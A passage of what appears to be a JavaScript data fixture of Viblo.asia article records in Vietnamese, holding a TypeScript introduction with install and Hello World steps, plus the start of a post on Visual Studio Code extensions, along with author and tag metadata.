kha\u0301c nhau va\u0300 cu\u0303ng la\u0300 c\u01a1 s\u01a1\u0309 \u0111\u00ea\u0309 vi\u00ea\u0323c ba\u0309o tri\u0300 d\u01b0\u0323 a\u0301n cu\u0309a ba\u0323n m\u00f4\u0323t ca\u0301ch d\u00ea\u0303 da\u0300ng h\u01a1n r\u00e2\u0301t nhi\u00ea\u0300u. \n\nT\u00f4i hi vo\u0323ng ca\u0301c ba\u0323n \u0111a\u0303 ho\u0323c th\u00eam \u0111\u01b0\u01a1\u0323c m\u00f4\u0323t \u0111i\u00ea\u0300u gi\u0300 m\u01a1\u0301i h\u00f4m nay!\n\n### Ta\u0300i li\u00ea\u0323u tham kha\u0309o\n\n* https://medium.com/dailyjs/the-7-js-array-methods-you-will-need-in-2021-a9faa83b50e8\n* https://www.tutorialspoint.com/javascript/javascript_html_dom.htm',
      published_at: "2021-03-18 21:22:15",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 7,
      points: 0,
      views_count: 35,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url: null,
      user: {
        data: {
          id: 29188,
          url: "https://viblo.asia/u/dangpham",
          avatar: "fe38ec7a-63c2-46b0-8bcc-b25136448b12.png",
          name: "hai dang pham",
          username: "dangpham",
          followers_count: 4,
          reputation: 237,
          posts_count: 15,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51435,
      title:
        "TypeScript - P1: V\u00ec sao TypeScript \u0111\u01b0\u1ee3c y\u00eau th\u00edch \u0111\u1ebfn v\u1eady?",
      slug: "1Je5E79LZnL",
      url:
        "https://viblo.asia/p/typescript-p1-vi-sao-typescript-duoc-yeu-thich-den-vay-1Je5E79LZnL",
      user_id: 33330,
      moderation: null,
      transliterated: "typescript-p1-vi-sao-typescript-duoc-yeu-thich-den-vay",
      contents_short:
        "Tr\u1ea3i nghi\u1ec7m th\u1ef1c t\u1ebf\n\nTr\u01b0\u1edbc khi l\u00e0 m\u1ed9t Web Developer, t\u00f4i l\u00e0 m\u1ed9t Mobile Developer v\u00e0 Java l\u00e0 th\u1ee9 m\u00e0 t\u00f4i t\u1eebng theo \u0111u\u1ed5i. Nh\u1eafc \u0111\u1ebfn Java ch\u00fang ta \u0111\u1ec1u bi\u1ebft n\u00f3 l\u00e0 m\u1ed9t ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng. ...",
      contents:
        "## Tr\u1ea3i nghi\u1ec7m th\u1ef1c t\u1ebf\n\nTr\u01b0\u1edbc khi l\u00e0 m\u1ed9t Web Developer, t\u00f4i l\u00e0 m\u1ed9t Mobile Developer v\u00e0 Java l\u00e0 th\u1ee9 m\u00e0 t\u00f4i t\u1eebng theo \u0111u\u1ed5i. Nh\u1eafc \u0111\u1ebfn Java ch\u00fang ta \u0111\u1ec1u bi\u1ebft n\u00f3 l\u00e0 m\u1ed9t ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng.\n\nM\u00f4 h\u00ecnh l\u1eadp tr\u00ecnh h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng h\u1ea7u nh\u01b0 \u0111\u01b0\u1ee3c \u00e1p d\u1ee5ng trong h\u1ea7u h\u1ebft c\u00e1c d\u1ef1 \u00e1n l\u1edbn. V\u1edbi nh\u1eefng \u01b0u \u0111i\u1ec3m m\u00e0 m\u00f4 h\u00ecnh n\u00e0y mang l\u1ea1i gi\u00fap t\u0103ng n\u0103ng su\u1ea5t, \u0111\u01a1n gi\u1ea3n h\u00f3a vi\u1ec7c b\u1ea3o tr\u00ec, d\u1ec5 d\u00e0ng m\u1edf r\u1ed9ng, code d\u1ec5 \u0111\u1ecdc d\u1ec5 hi\u1ec3u d\u1ec5 debug h\u01a1n...\n\nT\u00f4i y\u00eau th\u00edch Java v\u00ec m\u1ecdi th\u1ee9 \u0111\u1ec1u r\u00f5 r\u00e0ng, d\u1ec5 \u0111\u1ecdc, d\u1ec5 hi\u1ec3u, d\u1ec5 debug. V\u00ed d\u1ee5 nh\u01b0 \u0111\u1ecbnh ngh\u0129a r\u00f5 ki\u1ec3u d\u1eef li\u1ec7u c\u1ee7a bi\u1ebfn l\u00fac kh\u1edfi t\u1ea1o...\n\nT\u00f4i \u0111\u00e3 quen vi\u1ec7c khai b\u00e1o bi\u1ebfn v\u1edbi java:\n```\n// Java\nprivate String name;\nprivate int age;\nprivate double gpa;\n```\n\nM\u1ecdi th\u1ee9 \u0111\u1ec1u r\u00f5 r\u00e0ng, c\u00e1c bi\u1ebfn \u0111\u01b0\u1ee3c khai b\u00e1o v\u1edbi ki\u1ec3u d\u1eef li\u1ec7u c\u1ee5 th\u1ec3, n\u1ebfu g\u00e1n gi\u00e1 tr\u1ecb c\u00f3 ki\u1ec3u d\u1eef li\u1ec7u kh\u00e1c th\u00ec tr\u00ecnh bi\u00ean d\u1ecbch b\u00e1o l\u1ed7i (compile time), \u0111i\u1ec1u n\u00e0y gi\u00fap ti\u1ebft ki\u1ec7m \u0111\u01b0\u1ee3c kh\u00e1 nhi\u1ec1u th\u1eddi gian v\u00e0 c\u00f4ng s\u1ee9c.\n\nKhi chuy\u1ec3n sang l\u00e0m m\u1ed9t Web Developer, l\u00e0m quen v\u1edbi JavaScript, m\u1edbi \u0111\u1ea7u t\u00f4i c\u0169ng kh\u00e1 b\u1ee1 ng\u1ee1 v\u1ec1 \"xin t\u00e1ch\" khai b\u00e1o bi\u1ebfn c\u1ee7a n\u00f3.\n```\n// JavaScript\nvar age;\nlet gpa;\n```\n\n\u00c0 nh\u00ecn ng\u1eafn g\u1ecdn \u0111\u1ea5y, kh\u00e1 th\u00fa v\u1ecb, bi\u1ebfn c\u00f3 th\u1ec3 nh\u1eadn b\u1ea5t k\u1ef3 ki\u1ec3u d\u1eef li\u1ec7u n\u00e0o. \u0110\u00fang l\u00e0 ng\u00f4n ng\u1eef hi\u1ec7n \u0111\u1ea1i - ng\u1eafn g\u1ecdn v\u00e0 kh\u00f4ng y\u00eau c\u1ea7u ph\u1ea3i nh\u1edb nhi\u1ec1u ki\u1ec3u d\u1eef li\u1ec7u :scream:\n\n## V\u1ea5n \u0111\u1ec1 g\u1eb7p ph\u1ea3i\nTrong th\u1ef1c t\u1ebf, khi l\u00e0m vi\u1ec7c v\u1edbi JavaScript t\u00f4i \u0111\u00e3 g\u1eb7p m\u1ed9t v\u00e0i tr\u01b0\u1eddng h\u1ee3p:\n-  T\u00f4i khai b\u00e1o m\u1ed9t bi\u1ebfn array, sau qu\u00e1 tr\u00ecnh t\u00ednh to\u00e1n th\u00ec bi\u1ebfn n\u00e0y l\u1ea1i c\u00f3 gi\u00e1 tr\u1ecb l\u00e0 string. \u0110\u1ebfn khi x\u1ea3y ra l\u1ed7i, quay l\u1ea1i \u0111i\u1ec1u tra xem t\u1eebng \u0111o\u1ea1n code xem gi\u00e1 tr\u1ecb c\u1ee7a bi\u1ebfn \u0111\u00f3 l\u00e0 g\u00ec.\nM\u1eb7c d\u00f9 th\u1ea5y l\u1ed7i n\u00e0y c\u00f3 v\u1ebb \u0111\u01a1n gi\u1ea3n, nh\u01b0ng n\u00f3 t\u1ed1n kh\u00e1 nhi\u1ec1u th\u1eddi gian \u0111\u1ec3 debug :cry:. N\u1ebfu nh\u01b0 l\u1ed7i sai ki\u1ec3u d\u1eef li\u1ec7u n\u00e0y \u0111\u01b0\u1ee3c checking trong th\u1eddi gian compile time th\u00ec s\u1ebd t\u1ed1i \u01b0u th\u1eddi gian dev r\u1ea5t nhi\u1ec1u.\n\n- M\u1ed9t tr\u01b0\u1eddng h\u1ee3p n\u1eefa l\u00e0 c\u00f3 nhi\u1ec1u function trong codebase. Khi ai \u0111\u00f3 v\u00e0o \u0111\u1ecdc code, trong tr\u01b0\u1eddng h\u1ee3p code kh\u00f4ng c\u00f3 comment block, h\u1ecd l\u1ea1i m\u1ea5t th\u1eddi gian l\u1ea7n m\u00f2 xem h\u00e0m \u0111\u00f3 tr\u1ea3 v\u1ec1 g\u00ec, ki\u1ec3u d\u1eef li\u1ec7u g\u00ec? Tham s\u1ed1 truy\u1ec1n v\u00e0o l\u00e0 ki\u1ec3u g\u00ec? N\u1ebfu \u1edf v\u00e0o 1 codebase to v\u00e0 ph\u1ee9c t\u1ea1p th\u00ec ch\u01b0a c\u1ea7n l\u00e0m \u0111\u00e3 th\u1ea5y stress l\u1eafm r\u1ed3i.\n- \u1ede c\u00e1c d\u1ef1 \u00e1n l\u1edbn g\u1ecdi api c\u00e1c th\u1ee9, nh\u01b0ng trong api docs th\u00ec kh\u00f4ng c\u00f3 c\u1eadp nh\u1eadt th\u00f4ng tin chi ti\u1ebft v\u1ec1 api \u0111\u00f3, \u0111\u00e0nh ph\u1ea3i g\u1ecdi l\u1ea1i c\u00e1c api \u0111\u1ec3 check xem response tr\u1ea3 v\u1ec1 g\u1ed3m nh\u1eefng g\u00ec, ki\u1ec3u d\u1eef li\u1ec7u ra sao? Kh\u00e1 m\u1ec7t ph\u1ea3i kh\u00f4ng, nh\u01b0ng v\u1edbi TypeScript s\u1ebd ph\u1ea3i \u0111\u1ecbnh ngh\u0129a r\u00f5 r\u00e0ng nh\u1eefng th\u1ee9 \u0111\u00f3, ng\u01b0\u1eddi m\u1edbi v\u00e0o code ch\u1ec9 c\u1ea7n xem qua l\u00e0 bi\u1ebft response c\u1ee7a api n\u00e0y nh\u01b0 n\u00e0o r\u1ed3i.\n- H\u01a1n n\u1eefa khi api tr\u1ea3 v\u1ec1 response d\u1ea1ng object, n\u1ebfu s\u1eed d\u1ee5ng javascript l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 bi\u1ebft \u0111\u01b0\u1ee3c object \u0111\u00f3 c\u00f3 nh\u1eefng property n\u00e0o nh\u1ec9? L\u1ea1i ph\u1ea3i debug object \u0111\u00f3 ra \u0111\u1ec3 xem. Nh\u01b0ng v\u1edbi TypeScript \u0111\u00e3 suggest cho ch\u00fang ta bi\u1ebft object \u0111\u00f3 c\u00f3 nh\u1eefng property n\u00e0o \u0111\u1ec3 s\u1eed d\u1ee5ng (*th\u00f4ng qua \u0111\u1ecbnh ngh\u0129a interface m\u00ecnh s\u1ebd \u0111\u1ec1 c\u1eadp \u1edf s\u1ed1 sau*), gi\u00fap vi\u1ec7c code nhanh h\u01a1n, ti\u1ec7n h\u01a1n.\n\n## TypeScript\n\nV\u00e0 t\u00f4i \u0111\u00e3 t\u00ecm th\u1ea5y TypeScript - c\u00f3 th\u1ec3 n\u00f3i n\u00f3 l\u00e0 m\u1ed9t phi\u00ean b\u1ea3n n\u00e2ng cao c\u1ee7a JavaScript.\n\nTypeScript l\u00e0 m\u1ed9t ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng \u0111\u01b0\u1ee3c ph\u00e1t tri\u1ec3n b\u1edfi Microsoft - \u0111\u01b0\u1ee3c thi\u1ebft k\u1ebf ho\u00e0n to\u00e0n tu\u00e2n theo kh\u00e1i ni\u1ec7m OOPs (C\u00f3 v\u1ebb gi\u1ed1ng nh\u01b0 Java r\u1ed3i \u0111\u00e2y :yum:)).\n\nV\u1edbi s\u1ef1 h\u1ed7 tr\u1ee3 c\u1ee7a TSC (TypeScript Compiler), ch\u00fang ta c\u00f3 th\u1ec3 convert TypeScript code (.ts) sang JavaScript (.js). Nh\u01b0 v\u1eady b\u1eaft \u0111\u1ea7u v\u00e0 k\u1ebft th\u00fac c\u1ee7a TypeScript c\u0169ng ch\u1ec9 l\u00e0 JavaScript.  B\u1ea3n ch\u1ea5t c\u1ee7a n\u00f3 l\u00e0 convert file ts sang file js thu\u1ea7n \u0111\u1ec3 tr\u00ecnh duy\u1ec7t c\u00f3 th\u1ec3 \u0111\u1ecdc \u0111\u01b0\u1ee3c.\n\n![](https://images.viblo.asia/a2e68875-2d88-424c-99c3-49bf62f307da.png)\n\n\nPhi\u00ean b\u1ea3n \u0111\u1ea7u ti\u00ean (TypeScript 0.8) \u0111\u01b0\u1ee3c ph\u00e1t h\u00e0nh v\u00e0o n\u0103m 2012 b\u1edfi Anders Hejlsberg. V\u00e0 phi\u00ean b\u1ea3n m\u1edbi nh\u1ea5t l\u00e0 [TypeScript 3.0](https://www.typescriptlang.org/) \u0111\u01b0\u1ee3c ph\u00e1t h\u00e0nh v\u00e0o 07/2018.\n\n#### \u01afu/nh\u01b0\u1ee3c \u0111i\u1ec3m c\u1ee7a TypeScript\n\n##### a. \u01afu \u0111i\u1ec3m\n* D\u1ec5 d\u00e0ng h\u01a1n trong ph\u00e1t tri\u1ec3n c\u00e1c d\u1ef1 \u00e1n l\u1edbn, \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3 b\u1edfi c\u00e1c Javascript Framework l\u1edbn.\n* H\u1ea7u h\u1ebft c\u00e1c c\u00fa ph\u00e1p h\u01b0\u1edbng \u0111\u1ed1i t\u01b0\u1ee3ng \u0111\u1ec1u \u0111\u01b0\u1ee3c h\u1ed7 tr\u1ee3 b\u1edfi Typescript nh\u01b0 k\u1ebf th\u1eeba, \u0111\u00f3ng g\u00f3i, constructor, abstract, interface, implement, override\u2026v.v\n* C\u00e1ch t\u1ed5 ch\u1ee9c code r\u00f5 r\u00e0ng h\u01a1n, h\u1ed7 tr\u1ee3 c\u01a1 ch\u1ebf gi\u00fap ki\u1ebfn tr\u00fac h\u1ec7 th\u1ed1ng code h\u01b0\u1edbng module, h\u1ed7 tr\u1ee3 namespace, gi\u00fap x\u00e2y d\u1ef1ng c\u00e1c h\u1ec7 th\u1ed1ng l\u1edbn n\u01a1i m\u00e0 nhi\u1ec1u l\u1eadp tr\u00ecnh vi\u00ean c\u00f3 th\u1ec3 l\u00e0m vi\u1ec7c c\u00f9ng nhau m\u1ed9t c\u00e1ch d\u1ec5 d\u00e0ng h\u01a1n.\n* H\u1ed7 tr\u1ee3 c\u00e1c t\u00ednh n\u0103ng m\u1edbi nh\u1ea5t c\u1ee7a Javascript. TypeScript lu\u00f4n \u0111\u1ea3m b\u1ea3o vi\u1ec7c s\u1eed d\u1ee5ng \u0111\u1ea7y \u0111\u1ee7 c\u00e1c k\u1ef9 thu\u1eadt m\u1edbi nh\u1ea5t c\u1ee7a Javascript, v\u00ed d\u1ee5 nh\u01b0 version hi\u1ec7n t\u1ea1i l\u00e0 ECMAScript 2015 (ES6).\n* M\u1ed9t l\u1ee3i th\u1ebf c\u1ee7a Typescript n\u1eefa l\u00e0 m\u00e3 ngu\u1ed3n m\u1edf v\u00ec v\u1eady n\u00f3 mi\u1ec5n ph\u00ed v\u00e0 c\u00f3 c\u1ed9ng \u0111\u1ed3ng h\u1ed7 tr\u1ee3 r\u1ea5t l\u1edbn.\n* V\u1edbi *static typing (ki\u1ec3m tra l\u1ed7i l\u00fac compile time)*, code vi\u1ebft b\u1eb1ng TypeScript d\u1ec5 d\u1ef1 \u0111o\u00e1n h\u01a1n, v\u00e0 d\u1ec5 debug h\u01a1n.\n\nTypescript \u0111ang \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng \u1edf c\u00e1c Framework ph\u1ed5 bi\u1ebfn nh\u01b0 Angular, Nodejs, VueJs\u2026\n\n##### b. Nh\u01b0\u1ee3c \u0111i\u1ec3m\nB\u1ea5t k\u1ef3 ng\u00f4n ng\u1eef n\u00e0o c\u0169ng c\u00f3 \u0111i\u1ec3m y\u1ebfu v\u00e0 h\u1ea1n ch\u1ebf c\u1ee7a n\u00f3, v\u00e0 TypeScript c\u0169ng v\u1eady, \u0111i\u1ec3m h\u1ea1n ch\u1ebf c\u1ee7a TypeScript l\u00e0:\n* B\u1eaft bu\u1ed9c d\u00f9ng bi\u00ean d\u1ecbch\n* Ch\u1ec9 l\u00e0 ph\u1ea7n ng\u00f4n ng\u1eef m\u1edf r\u1ed9ng h\u1ed7 tr\u1ee3: Sau c\u00f9ng v\u1eabn bi\u00ean d\u1ecbch v\u1ec1 file js.\n\nTuy nhi\u00ean so v\u1edbi nh\u1eefng \u01b0u \u0111i\u1ec3m m\u00e0 TypeScript mang l\u1ea1i th\u00ec \u0111\u00e2y v\u1eabn l\u00e0 m\u1ed9t th\u1ee9 r\u1ea5t th\u00fa v\u1ecb.\n\n#### C\u00e1c IDE h\u1ed7 tr\u1ee3 TypeScript\nHi\u1ec7n nay, r\u1ea5t nhi\u1ec1u IDE h\u1ed7 tr\u1ee3 s\u1eb5n ho\u1eb7c th\u00f4ng qua c\u00e1c plugin \u0111\u1ec3 h\u1ed7 tr\u1ee3 c\u00fa ph\u00e1p c\u1ee7a TypeScript, auto-complete suggestions, b\u1eaft l\u1ed7i v\u00e0 th\u1eadm ch\u00ed t\u00edch h\u1ee3p s\u1eb5n tr\u00ecnh bi\u00ean d\u1ecbch.\n* Visual Studio Code \u2013 M\u1ed9t tr\u00ecnh so\u1ea1n th\u1ea3o m\u00e3 ngu\u1ed3n m\u1edf c\u1ee7a Microsoft. H\u1ed7 tr\u1ee3 s\u1eb5n TypeScipt.\n* Plugin cho Sublime Text\n* Phi\u00ean b\u1ea3n m\u1edbi nh\u1ea5t c\u1ee7a WebStorm c\u0169ng h\u1ed7 tr\u1ee3 TypeScript\n* V\u00e0 nhi\u1ec1u tr\u00ecnh so\u1ea1n th\u1ea3o kh\u00e1c nh\u01b0 Vim, Atom, Emacs \u2026\n\n## C\u00e0i \u0111\u1eb7t TypeScript\n\nN\u00f3i th\u00ec s\u1ebd ch\u1eb3ng hi\u1ec3u \u0111\u01b0\u1ee3c l\u00e2u, c\u00f3 l\u1ebd ch\u00fang ta ph\u1ea3i nh\u1ea3y v\u00e0o \"c\u1ed1t\" xem m\u1eb7t m\u0169i n\u00f3 th\u1ebf n\u00e0o nh\u1ec9? \u00c0 m\u00e0 tr\u01b0\u1edbc ti\u00ean ch\u00fang ta ph\u1ea3i c\u00e0i \u0111\u1eb7t \u0111\u00e3 nh\u1ec9.\n\nC\u00e0i \u0111\u1eb7t TypeScript c\u0169ng k c\u00f3 g\u00ec qu\u00e1 ph\u1ee9c t\u1ea1p. Th\u00f4ng qua [npm](https://www.npmjs.com/get-npm), s\u1eed d\u1ee5ng l\u1ec7nh d\u01b0\u1edbi \u0111\u00e2y c\u00f3 th\u1ec3 c\u00e0i \u0111\u1eb7t TypeScript to\u00e0n c\u1ee5c, gi\u00fap cho tr\u00ecnh bi\u00ean d\u1ecbch TypeScript c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng trong m\u1ecdi d\u1ef1 \u00e1n ([tham kh\u1ea3o](https://www.typescriptlang.org/download)).\n\n```\nnpm install -g typescript\n```\n\nKi\u1ec3m tra c\u00e0i \u0111\u1eb7t b\u1eb1ng l\u1ec7nh:\n\n```\ntsc -v\n```\n\nTh\u1ebf l\u00e0 ch\u00fang ta \u0111\u00e3 set up xong r\u1ed3i \u0111\u00f3. Tr\u01b0\u1edbc khi l\u00e0m c\u00e1i demo h\u00e3y l\u00e0m ng\u1ee5m tr\u00e0 \u0111\u00e3 nh\u1ec9 :beers:\n\nOk... Ch\u00fang ta s\u1ebd l\u00e0m quen v\u1edbi TypeScript th\u00f4ng qua m\u1ed9t v\u00ed d\u1ee5 si\u00eau kinh \u0111i\u1ec3n trong m\u1ecdi ng\u00f4n ng\u1eef l\u1eadp tr\u00ecnh - HelloWord =))\n* \u0110\u1ea7u ti\u00ean s\u1ebd t\u1ea1o 1 file \u0111\u1eb7t t\u00ean l\u00e0 HelloWord v\u00e0 c\u00f3 \u0111u\u00f4i l\u00e0 .ts -> HelloWord.ts\n* Ti\u1ebfp theo l\u00e0m v\u00e0i d\u00f2ng code nh\u1ec9. Ch\u00fang ta ch\u1ec9 vi\u1ec7c d\u00f9ng JavaScript thu\u1ea7n th\u00f4i.\n```\nlet slogan: string = 'Welcome to TypeScript';\n\nconsole.log(slogan);\n```\n\u1ede \u0111\u00e2y t\u00f4i khai b\u00e1o 1 bi\u1ebfn slogan c\u00f3 ki\u1ec3u d\u1eef li\u1ec7u l\u00e0 string.\n\n* Okay, ti\u1ebfp theo ch\u00fang ta s\u1ebd bi\u00ean d\u1ecbch file .ts n\u00e0y sang file .js. Ch\u1ea1y l\u1ec7nh sau:\n```\ntsc HelloWord.ts\n```\nV\u00e0 \u0111\u00e2y l\u00e0 k\u1ebft qu\u1ea3 - t\u1ea1o ra file HelloWord.js:\n![](https://images.viblo.asia/19d46d65-ff07-41d5-9778-10251072f6ad.png)\n\n```\nvar slogan = 'Welcome to TypeScript';\nconsole.log(slogan);\n```\n\n***Tips**: N\u1ebfu b\u1ea1n mu\u1ed1n bi\u00ean d\u1ecbch t\u1ea5t c\u1ea3 c\u00e1c file TypeScript b\u00ean trong b\u1ea5t k\u1ef3 th\u01b0 m\u1ee5c n\u00e0o, h\u00e3y s\u1eed d\u1ee5ng l\u1ec7nh: tsc  .ts.*\n\n\u0110\u00f3, xong r\u1ed3i \u0111\u00f3, th\u1eadt \u0111\u01a1n gi\u1ea3n ph\u1ea3i kh\u00f4ng n\u00e0o.\n\n\u00c0, ch\u00fang ta s\u1ebd thay \u0111\u1ed5i 1 ch\u00fat nh\u00e9, gi\u1edd s\u1ebd \u0111\u1ed5i ki\u1ec3u d\u1eef li\u1ec7u c\u1ee7a bi\u1ebfn slogan t\u1eeb string th\u00e0nh number. Oops, n\u00f3 b\u00e1o l\u1ed7i ngay trong th\u1eddi gian compile time, qu\u00e1 tuy\u1ec7t v\u1eddi :wine_glass:\n\n![](https://images.viblo.asia/16c33500-1588-4982-a480-0c8c06086a93.png)\n\n## K\u1ebft lu\u1eadn\nH\u00f4m nay \u0111\u1ebfn \u0111\u00e2y th\u00f4i nh\u1ec9. Tr\u1ecdng t\u00e2m b\u00e0i vi\u1ebft n\u00e0y t\u00f4i mu\u1ed1n chia s\u1ebb v\u1edbi c\u00e1c b\u1ea1n v\u1ea5n \u0111\u1ec1 g\u1eb7p ph\u1ea3i khi t\u00f4i l\u00e0m vi\u1ec7c JavaScript v\u00e0 gi\u1edbi thi\u1ec7u \u0111\u1ebfn c\u00e1c b\u1ea1n m\u1ed9t version cao c\u1ea5p h\u01a1n c\u1ee7a JavaScript \u0111\u00f3 l\u00e0 TypeScript.\n\nC\u00f2n r\u1ea5t nhi\u1ec1u \u0111i\u1ec1u th\u00fa v\u1ecb v\u1ec1 TypeScript, nh\u01b0ng h\u1eb9n c\u00e1c b\u1ea1n \u1edf s\u1ed1 ti\u1ebfp theo nh\u00e9!\n\nC\u1ea3m \u01a1n c\u00e1c b\u1ea1n \u0111\u00e3 \u0111\u1ecdc.",
      published_at: "2021-03-18 16:11:46",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 9,
      points: 1,
      views_count: 70,
      clips_count: 0,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/a2e68875-2d88-424c-99c3-49bf62f307da.png",
      user: {
        data: {
          id: 33330,
          url: "https://viblo.asia/u/hoangbn-1772",
          avatar: "8ed55617-f733-47b0-bb0a-d86529bbe5e9.jpg",
          name: "Bui Ngoc Hoang",
          username: "hoangbn-1772",
          followers_count: 6,
          reputation: 323,
          posts_count: 20,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "fe",
            name: "FE",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=FE&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "typescript",
            name: "TypeScript",
            primary: false,
            image:
              "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=TypeScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51450,
      title: "1 s\u1ed1 ti\u1ec7n \u00edch h\u1eefu \u00edch cho Visual Code",
      slug: "maGK7A0Dlj2",
      url:
        "https://viblo.asia/p/1-so-tien-ich-huu-ich-cho-visual-code-maGK7A0Dlj2",
      user_id: 23879,
      moderation: null,
      transliterated: "1-so-tien-ich-huu-ich-cho-visual-code",
      contents_short:
        "Gi\u1edbi thi\u1ec7u\nCh\u00e0o m\u1ecdi ng\u01b0\u1eddi.<br>\nHi\u1ec7n nay trong m\u00f4i tr\u01b0\u1eddng ph\u00e1t tri\u1ec3n c\u00f3 r\u1ea5t nhi\u1ec1u c\u00f4ng c\u1ee5 gi\u00fap ch\u00fang ta c\u00f3 th\u1ec3 vi\u1ebft code n\u1ed5i ti\u1ebfng nh\u01b0 Sublime, Atom, Visual Code v\u00e0 nhi\u1ec1u c\u00f4ng c\u1ee5 kh\u00e1c n\u1eefa nh\u01b0ng c\u00f3 l...",
      contents:
        "### Gi\u1edbi thi\u1ec7u\nCh\u00e0o m\u1ecdi ng\u01b0\u1eddi.<br>\nHi\u1ec7n nay trong m\u00f4i tr\u01b0\u1eddng ph\u00e1t tri\u1ec3n c\u00f3 r\u1ea5t nhi\u1ec1u c\u00f4ng c\u1ee5 gi\u00fap ch\u00fang ta c\u00f3 th\u1ec3 vi\u1ebft code n\u1ed5i ti\u1ebfng nh\u01b0 Sublime, Atom, Visual Code v\u00e0 nhi\u1ec1u c\u00f4ng c\u1ee5 kh\u00e1c n\u1eefa nh\u01b0ng c\u00f3 l\u1ebd trong v\u00e0i n\u0103m g\u1ea7n \u0111\u00e2y Visual Code \u0111ang n\u1ed5i l\u00ean nh\u01b0 1 c\u00f4ng c\u1ee5 ph\u1ed5 bi\u1ebfn m\u00e0 r\u1ea5t nhi\u1ec1u ng\u01b0\u1eddi ban \u0111\u1ea7u t\u1eeb d\u00f9ng nh\u1eefng c\u00f4ng c\u1ee5 kh\u00e1c c\u0169ng \u0111\u00e3 th\u1eed v\u1edbi Visual Code v\u00e0 d\u1ea7n th\u00edch n\u00f3. H\u00f4m nay m\u00ecnh xin gi\u1edbi thi\u1ec7u 1 s\u1ed1 extention h\u1eefu \u00edch gi\u00fap cho vi\u1ec7c code (Frontend) tr\u1edf n\u00ean tho\u1ea3i m\u00e1i v\u00e0 thu\u1eadn ti\u1ec7n nh\u00e9.\n![](https://images.viblo.asia/4251873b-29eb-4222-be57-652a171d386a.jpeg)\n\n###  Ti\u1ec7n \u00edch m\u1edf r\u1ed9ng\n\n**1.[Auto Rename Tag](https://marketplace.visualstudio.com/items?itemName=formulahendry.auto-rename-tag)**\n\n![](https://images.viblo.asia/50e703e9-ff7d-44e5-a07c-8c1863630344.gif)\nC\u00e1i n\u00e0y th\u1ef1c s\u1ef1 thu\u1eadn ti\u1ec7n khi b\u1ea1n mu\u1ed1n s\u1eeda l\u1ea1i t\u00ean  HTML, n\u1ebfu b\u1ea1n s\u1eeda th\u1ebb \u0111\u1ea7u n\u00f3 s\u1ebd t\u1ef1 \u0111\u1ed9ng nh\u1eadn bi\u1ebft s\u1eeda lu\u00f4n th\u1ebb \u0111\u00f3ng cho m\u00ecnh r\u1ea5t l\u00e0 thu\u1eadn ti\u1ec7n, gi\u1ea3m b\u1edbt th\u1eddi gian ch\u1ec9nh s\u1eeda.\n\n**2.[Relative Path](https://marketplace.visualstudio.com/items?itemName=jakob101.RelativePath)**\n\n![](https://images.viblo.asia/9ef6d584-6c26-4a7f-a17f-e7a0d6dd0538.gif)\n\nTi\u1ec7n \u00edch n\u00e0y gi\u00fap ch\u00fang ta t\u1ea1o absolute path c\u1ef1c nhanh thay v\u00ec vi\u1ebft tay th\u1ee7 c\u00f4ng t\u1ed1n th\u1eddi gian. Khi c\u00e0i v\u00e0o ch\u00fang ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng t\u1ed5 h\u1ee3p ph\u00edm `Ctrl+Shift+H` tr\u00ean Windows, `Command+shift+H` tr\u00ean Mac \u0111\u1ec3 m\u1edf c\u1eeda s\u1ed5 ch\u1ecdn file, khi ch\u1ecdn n\u00f3 s\u1ebd t\u1ef1 \u0111\u1ed9ng t\u1ea1o Relative path cho m\u00ecnh. Ngo\u00e0i ra ch\u00fang ta c\u0169ng c\u00f3 th\u1ec3 m\u1edf c\u1eeda s\u1ed5 `comman palette` \u0111\u1ec3 t\u00ecm ki\u1ebfm c\u0169ng \u0111\u01b0\u1ee3c, r\u1ea5t thu\u1eadn ti\u1ec7n \u0111\u00fang kh\u00f4ng \u1ea1.\n\n**3.[htmltagwrap](https://marketplace.visualstudio.com/items?itemName=bradgashler.htmltagwrap)**\n\n![](https://images.viblo.asia/6caed268-49ae-45b9-b117-f7ff4a90b088.gif)\nTi\u1ec7n \u00edch n\u00e0y gi\u00fap ch\u00fang ta ch\u1ecdn 1 \u0111o\u1ea1n text hay 1 th\u1ebb div mu\u1ed1n block th\u00eam th\u1ebb kh\u00e1c b\u00ean ngo\u00e0i ch\u00fang ta c\u00f3 th\u1ec3 b\u00f4i ch\u1ecdn r\u1ed3i vi\u1ebft 